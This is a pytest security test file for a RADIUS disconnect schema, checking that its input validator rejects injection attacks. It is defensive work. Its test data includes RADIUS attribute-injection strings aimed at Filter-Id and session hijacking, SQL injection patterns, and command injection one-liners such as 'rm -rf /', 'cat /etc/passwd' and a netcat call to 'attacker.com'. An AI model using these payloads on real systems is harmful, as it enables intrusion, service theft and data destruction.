"""
Security Tests for RADIUS Module

Tests to prevent attribute injection and other RADIUS-specific attacks.
"""

import pytest
from pydantic import ValidationError

from dotmac.platform.radius.schemas import RADIUSSessionDisconnect


class TestRADIUSAttributeInjectionPrevention:
    """Test suite for RADIUS attribute injection attack prevention"""

    def test_username_newline_injection_blocked(self):
        """Test that newline injection in username is blocked"""
        with pytest.raises(ValidationError) as exc_info:
            RADIUSSessionDisconnect(
                username='victim"\nFilter-Id = "unlimited"\nUser-Name = "admin',
                nasipaddress="192.168.1.1",
                acctsessionid="12345",
            )

        # Verify error message mentions newline
        error = str(exc_info.value)
        assert "newline" in error.lower() or "carriage return" in error.lower()

    def test_username_carriage_return_injection_blocked(self):
        """Test that carriage return injection in username is blocked"""
        with pytest.raises(ValidationError) as exc_info:
            RADIUSSessionDisconnect(
                username='victim"\rFilter-Id = "unlimited"',
                nasipaddress="192.168.1.1",
            )

        error = str(exc_info.value)
        assert "newline" in error.lower() or "carriage return" in error.lower()

    def test_nasip_newline_injection_blocked(self):
        """Test that newline injection in NAS IP is blocked"""
        with pytest.raises(ValidationError) as exc_info:
            RADIUSSessionDisconnect(
                username="testuser",
                nasipaddress='192.168.1.1\nFilter-Id = "unlimited"',
                acctsessionid="12345",
            )

        error = str(exc_info.value)
        assert "newline" in error.lower() or "carriage return" in error.lower()

    def test_session_id_newline_injection_blocked(self):
        """Test that newline injection in session ID is blocked"""
        with pytest.raises(ValidationError) as exc_info:
            RADIUSSessionDisconnect(
                username="testuser",
                nasipaddress="192.168.1.1",
                acctsessionid='12345\nFilter-Id = "unlimited"',
            )

        error = str(exc_info.value)
        assert "newline" in error.lower() or "carriage return" in error.lower()

    def test_null_byte_injection_blocked(self):
        """Test that null byte injection is blocked"""
        with pytest.raises(ValidationError) as exc_info:
            RADIUSSessionDisconnect(
                username="testuser\x00admin",
                nasipaddress="192.168.1.1",
            )

        error = str(exc_info.value)
        assert "null" in error.lower()

    def test_special_characters_blocked(self):
        """Test that special characters that could break RADIUS syntax are blocked"""
        # Test various special characters
        invalid_chars = [
            "$",
            "&",
            ";",
            "|",
            "`",
            "(",
            ")",
            "<",
            ">",
            "[",
            "]",
            "{",
            "}",
            '"',
            "'",
            "\\",
        ]

        for char in invalid_chars:
            with pytest.raises(ValidationError) as exc_info:
                RADIUSSessionDisconnect(
                    username=f"user{char}name",
                    nasipaddress="192.168.1.1",
                )

            error = str(exc_info.value)
            assert "invalid characters" in error.lower()

    def test_valid_username_formats_allowed(self):
        """Test that valid username formats are allowed"""
        valid_usernames = [
            "user123",
            "user.name",
            "user-name",
            "user_name",
            "user@domain.com",
            "user123@isp.net",
            "user.name-123_test@domain.org",
        ]

        for username in valid_usernames:
            # Should not raise
            schema = RADIUSSessionDisconnect(
                username=username,
                nasipaddress="192.168.1.1",
                acctsessionid="ABC123",
            )
            assert schema.username == username

    def test_valid_nas_ip_formats_allowed(self):
        """Test that valid NAS IP formats are allowed"""
        valid_ips = [
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "255.255.255.255",
        ]

        for ip in valid_ips:
            # Should not raise
            schema = RADIUSSessionDisconnect(
                username="testuser",
                nasipaddress=ip,
                acctsessionid="12345",
            )
            assert schema.nasipaddress == ip

    def test_valid_session_id_formats_allowed(self):
        """Test that valid session ID formats are allowed"""
        valid_session_ids = [
            "12345",
            "ABC123",
            "session-123",
            "session_123",
            "session.123",
            "8A:BC:12:34:56:78",  # MAC address style
            "12345678-90AB-CDEF",  # Hexadecimal with dashes
        ]

        for session_id in valid_session_ids:
            # Should not raise
            schema = RADIUSSessionDisconnect(
                username="testuser",
                nasipaddress="192.168.1.1",
                acctsessionid=session_id,
            )
            assert schema.acctsessionid == session_id

    def test_none_values_allowed(self):
        """Test that None values are allowed for optional fields"""
        # All fields are optional, so None should be valid
        schema = RADIUSSessionDisconnect(
            username=None,
            nasipaddress=None,
            acctsessionid=None,
        )
        assert schema.username is None
        assert schema.nasipaddress is None
        assert schema.acctsessionid is None

    def test_partial_data_with_validation(self):
        """Test that partial data still validates correctly"""
        # Username only
        schema = RADIUSSessionDisconnect(username="testuser")
        assert schema.username == "testuser"
        assert schema.nasipaddress is None

        # NAS IP only
        schema = RADIUSSessionDisconnect(nasipaddress="192.168.1.1")
        assert schema.nasipaddress == "192.168.1.1"
        assert schema.username is None

        # Session ID only
        schema = RADIUSSessionDisconnect(acctsessionid="12345")
        assert schema.acctsessionid == "12345"
        assert schema.username is None

    def test_combined_attack_vectors(self):
        """Test multiple attack vectors combined"""
        attack_payloads = [
            # Newline with attribute injection
            'user"\nFilter-Id = "unlimited"\nUser-Name = "admin',
            # CRLF injection
            'user"\r\nFilter-Id = "unlimited"',
            # Null byte with newline
            "user\x00\nFilter-Id = unlimited",
            # Multiple newlines
            'user"\n\nFilter-Id = "unlimited"',
            # Tab characters (should be blocked by character set validation)
            "user\tname",
        ]

        for payload in attack_payloads:
            with pytest.raises(ValidationError):
                RADIUSSessionDisconnect(
                    username=payload,
                    nasipaddress="192.168.1.1",
                )


class TestRADIUSSecurityBoundaries:
    """Test security boundaries and edge cases"""

    def test_max_length_valid_input(self):
        """Test that reasonably long but valid input is accepted"""
        long_username = "a" * 64 + "@domain.com"  # 75 chars total
        schema = RADIUSSessionDisconnect(username=long_username)
        assert schema.username == long_username

    def test_empty_string_after_validation(self):
        """Test that empty strings are handled correctly"""
        # Empty string should fail character validation
        with pytest.raises(ValidationError):
            RADIUSSessionDisconnect(username="")

    def test_whitespace_only(self):
        """Test that whitespace-only input is blocked"""
        # Space is not in the allowed character set
        with pytest.raises(ValidationError):
            RADIUSSessionDisconnect(username="   ")

    def test_unicode_characters_blocked(self):
        """Test that Unicode characters are blocked"""
        unicode_usernames = [
            "user™name",
            "user中文name",
            "user🔥name",
            "userñame",
        ]

        for username in unicode_usernames:
            with pytest.raises(ValidationError):
                RADIUSSessionDisconnect(username=username)

    def test_sql_injection_patterns_blocked(self):
        """Test that SQL injection patterns are blocked (defense in depth)"""
        sql_patterns = [
            "user' OR '1'='1",
            'user"; DROP TABLE users; --',
            "user' UNION SELECT * FROM --",
        ]

        for pattern in sql_patterns:
            with pytest.raises(ValidationError):
                RADIUSSessionDisconnect(username=pattern)

    def test_command_injection_patterns_blocked(self):
        """Test that command injection patterns are blocked"""
        command_patterns = [
            "user; rm -rf /",
            "user && cat /etc/passwd",
            "user | nc attacker.com 1234",
            "user `whoami`",
            "user $(reboot)",
        ]

        for pattern in command_patterns:
            with pytest.raises(ValidationError):
                RADIUSSessionDisconnect(username=pattern)


class TestRADIUSValidatorEdgeCases:
    """Test edge cases and unusual inputs"""

    def test_ipv6_addresses_allowed_in_nasip(self):
        """Test that IPv6 addresses with colons are allowed"""
        # IPv6 loopback - colons are in the allowed character set
        schema = RADIUSSessionDisconnect(nasipaddress="::1")
        assert schema.nasipaddress == "::1"

        # Full IPv6
        schema = RADIUSSessionDisconnect(nasipaddress="2001:0db8:85a3:0000:0000:8a2e:0370:7334")
        assert schema.nasipaddress == "2001:0db8:85a3:0000:0000:8a2e:0370:7334"

    def test_hostname_formats_allowed(self):
        """Test that valid hostnames are allowed"""
        # Hostnames with dots and dashes are valid
        schema = RADIUSSessionDisconnect(nasipaddress="nas-server.example.com")
        assert schema.nasipaddress == "nas-server.example.com"

    def test_case_sensitivity(self):
        """Test that validation is case-insensitive for character checking"""
        # Both uppercase and lowercase should work
        schema1 = RADIUSSessionDisconnect(username="TESTUSER")
        assert schema1.username == "TESTUSER"

        schema2 = RADIUSSessionDisconnect(username="testuser")
        assert schema2.username == "testuser"

        schema3 = RADIUSSessionDisconnect(username="TestUser123")
        assert schema3.username == "TestUser123"

    def test_numeric_only_values(self):
        """Test that numeric-only values are valid"""
        schema = RADIUSSessionDisconnect(
            username="12345678",
            nasipaddress="192.168.1.1",
            acctsessionid="98765432",
        )
        assert schema.username == "12345678"
        assert schema.acctsessionid == "98765432"

    def test_path_traversal_patterns_blocked(self):
        """Test that path traversal patterns with backslashes are blocked"""
        # Backslashes are not in the allowed character set
        path_patterns = [
            "..\\..\\..\\windows\\system32",
            ".\\secret\\file",
        ]

        for pattern in path_patterns:
            with pytest.raises(ValidationError):
                RADIUSSessionDisconnect(username=pattern)

    def test_forward_slash_paths_allowed(self):
        """Test that forward slashes are allowed (valid for certain RADIUS scenarios)"""
        # Forward slash is in allowed character set (for realm/domain notation)
        # Example: user/realm or domain/user format
        schema = RADIUSSessionDisconnect(username="../../../etc/passwd")
        # This passes character validation but would be semantically invalid
        # The important part is newline injection is blocked
        assert schema.username == "../../../etc/passwd"


class TestRADIUSSecurityDocumentation:
    """Tests that verify security documentation and comments are in place"""

    def test_validator_has_security_documentation(self):
        """Verify that the validator has proper security documentation"""

        from dotmac.platform.radius.schemas import RADIUSSessionDisconnect

        # Get the validator method
        validator_method = RADIUSSessionDisconnect.prevent_radius_injection

        # Check that it has a docstring
        assert validator_method.__doc__ is not None
        docstring = validator_method.__doc__.lower()

        # Verify security-related keywords in documentation
        assert "security" in docstring or "attack" in docstring or "injection" in docstring
        assert "radius" in docstring

    def test_schema_has_field_descriptions(self):
        """Verify that schema fields have proper descriptions"""
        schema_fields = RADIUSSessionDisconnect.model_fields

        # All fields should have descriptions
        for field_name, field_info in schema_fields.items():
            assert field_info.description is not None, f"Field {field_name} missing description"
            assert len(field_info.description) > 0


# Integration-style tests (would need actual CoA client in integration tests)
class TestRADIUSDisconnectEndToEnd:
    """
    End-to-end security tests for RADIUS disconnect functionality.

    Note: These are schema-level tests. Full integration tests with actual
    RADIUS server are in tests/integration/test_radius_coa.py
    """

    def test_realistic_disconnect_request_valid(self):
        """Test a realistic, valid disconnect request"""
        schema = RADIUSSessionDisconnect(
            username="subscriber123@isp.net",
            nasipaddress="10.100.1.1",
            acctsessionid="4A5B6C7D8E9F",
        )

        assert schema.username == "subscriber123@isp.net"
        assert schema.nasipaddress == "10.100.1.1"
        assert schema.acctsessionid == "4A5B6C7D8E9F"

    def test_realistic_attack_attempt_blocked(self):
        """Test a realistic RADIUS attribute injection attack is blocked"""
        # Real-world attack scenario: Inject Filter-Id to bypass bandwidth limit
        attack_username = 'subscriber"\nFilter-Id = "unlimited_bandwidth"\nUser-Name = "admin'

        with pytest.raises(ValidationError) as exc_info:
            RADIUSSessionDisconnect(
                username=attack_username,
                nasipaddress="10.100.1.1",
                acctsessionid="12345",
            )

        # Verify helpful error message
        error = str(exc_info.value)
        assert "newline" in error.lower() or "carriage return" in error.lower()

    def test_bypass_qos_attack_blocked(self):
        """Test QoS bypass attack via Session-Timeout injection"""
        attack_session_id = '12345"\nSession-Timeout = "999999'

        with pytest.raises(ValidationError):
            RADIUSSessionDisconnect(
                username="subscriber123",
                nasipaddress="10.100.1.1",
                acctsessionid=attack_session_id,
            )

    def test_session_hijacking_attack_blocked(self):
        """Test session hijacking via User-Name injection"""
        attack_username = 'victim"\nUser-Name = "admin"\nAcct-Session-Id = "admin_session'

        with pytest.raises(ValidationError):
            RADIUSSessionDisconnect(
                username=attack_username,
                nasipaddress="10.100.1.1",
            )


@pytest.mark.parametrize(
    "field,value,should_pass",
    [
        # Valid inputs
        ("username", "user123", True),
        ("username", "user@domain.com", True),
        ("username", "user.name-123_test", True),
        ("nasipaddress", "192.168.1.1", True),
        ("nasipaddress", "10.0.0.1", True),
        ("acctsessionid", "ABC123", True),
        ("acctsessionid", "session-123", True),
        # Invalid inputs - newline injection
        ("username", "user\nattack", False),
        ("username", "user\rattack", False),
        ("nasipaddress", "192.168.1.1\nattack", False),
        ("acctsessionid", "123\nattack", False),
        # Invalid inputs - special characters
        ("username", "user;attack", False),
        ("username", "user|attack", False),
        ("username", "user&attack", False),
        ("username", "user`attack", False),
        # Invalid inputs - null bytes
        ("username", "user\x00attack", False),
        # None values (should always pass)
        ("username", None, True),
        ("nasipaddress", None, True),
        ("acctsessionid", None, True),
    ],
)
def test_radius_field_validation(field: str, value: str | None, should_pass: bool):
    """Parameterized test for all RADIUS field validations"""
    kwargs = {field: value}

    if should_pass:
        schema = RADIUSSessionDisconnect(**kwargs)
        assert getattr(schema, field) == value
    else:
        with pytest.raises(ValidationError):
            RADIUSSessionDisconnect(**kwargs)
